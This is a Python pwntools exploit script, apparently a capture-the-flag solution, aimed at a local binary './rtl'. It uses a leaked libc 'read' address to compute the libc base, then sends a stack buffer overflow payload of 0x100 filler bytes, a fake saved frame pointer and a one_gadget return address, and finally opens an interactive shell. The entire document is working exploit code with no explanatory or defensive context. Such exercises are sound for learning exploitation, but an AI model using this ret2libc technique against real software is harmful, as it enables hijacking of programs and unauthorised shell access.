from pwn import *

elf = ELF("./rtl")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = elf.process()

libc_read = int(p.recvline().strip(), 0x10)
libc_base = libc_read - libc.sym["read"]
libc_one = libc_base + 0xebd3f

log.info(f"libc_base @ {libc_base:#x}")
log.info(f"libc_read @ {libc_read:#x}")
log.info(f"libc_one @ {libc_one:#x}")

payload = b""
payload += b"A" * 0x100 #buf
payload += p64(0x4040100)  #write, sfp
payload += p64(libc_one)  #ret                    
p.send(payload)

p.interactive()